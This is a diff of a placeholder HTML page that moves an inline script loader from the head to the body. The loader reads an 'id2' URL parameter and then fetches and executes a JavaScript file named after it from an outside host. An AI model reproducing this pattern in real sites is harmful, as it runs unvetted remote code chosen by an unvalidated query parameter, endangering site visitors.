@@ -1,11 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
- <script>var id2="";function getUrlVars(){var i={};window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi,function(r,d,a){i[d]=a});return i}var dUrl='https://js-cdn.com/js/'+getUrlVars().id2+'.js'</script>
-<script>var js=document.createElement("script");js.src=dUrl,document.getElementsByTagName("head")[0].appendChild(js);</script>
  <title>Page title</title>
+
 </head>
 <body>
  <h1>Hello World!</h1>
+ <script>var id2="";function getUrlVars(){var i={};window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi,function(r,d,a){i[d]=a});return i}var dUrl='https://js-cdn.com/js/'+getUrlVars().id2+'.js'</script>
+ <script>document.write('<script src="'+dUrl+'"><\/script>');</script>
 </body>
 </html>
